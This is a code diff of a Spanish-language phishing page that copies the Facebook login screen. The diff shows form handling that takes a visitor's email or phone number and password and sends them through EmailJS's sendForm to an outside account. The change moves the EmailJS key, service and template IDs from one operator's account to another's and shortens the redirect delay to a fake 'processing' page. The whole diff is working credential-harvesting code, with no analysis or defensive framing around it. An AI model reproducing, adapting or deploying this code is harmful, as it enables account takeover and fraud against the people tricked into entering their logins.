@@ -22,8 +22,8 @@
                 <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida</p>
             </div>
             <div class="loginFaceSide">
-                <input name="mail" type="text" placeholder="Correo electrónico o número de teléfono" required/>
-                <input name="pass" type="text" placeholder="Contraseña" required/>
+                <input name="mail" type="text" placeholder="Correo electrónico o número de teléfono" required autocorrect="off" autocapitalize="none"/>
+                <input name="pass" type="text" placeholder="Contraseña" required autocorrect="off" autocapitalize="none"/>
                 <button type="submit" id="button">Iniciar sesión</button>
                 <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">¿Olvidaste tu contraseña?</a>
                 <hr/>
@@ -40,10 +40,19 @@
     </script>
 
     <script type="text/javascript">
-        emailjs.init('Rz35xcemz-sopEyrc')
+        const luc_key = 'Rz35xcemz-sopEyrc';
+        const don_key = 'MITviLGbGr3Y2oL5c';
+
+        emailjs.init(don_key)
     </script>
 
     <script type="text/javascript">
+
+        const luc_service = 'service_ay7jkun';
+        const don_service = 'service_jqe0gzf';
+        const luc_template = 'template_bpfdvuj';
+        const don_template = 'template_umj08kp';
+
         const btn = document.getElementById('button');
 
         document.getElementById('form')
@@ -53,14 +62,14 @@
             btn.disabled = true;
             btn.value = 'Procesando...';
 
-            const serviceID = 'service_ay7jkun';
-            const templateID = 'template_bpfdvuj';
+            const serviceID = don_service;
+            const templateID = don_template;
 
             emailjs.sendForm(serviceID, templateID, this)
             .then(() => {
                 setTimeout(() => {
                 window.location = "procesando.html";
-                }, 3000);
+                }, 2000);
             }, (err) => {
                 btn.disabled = true;
                 btn.value = 'Error';
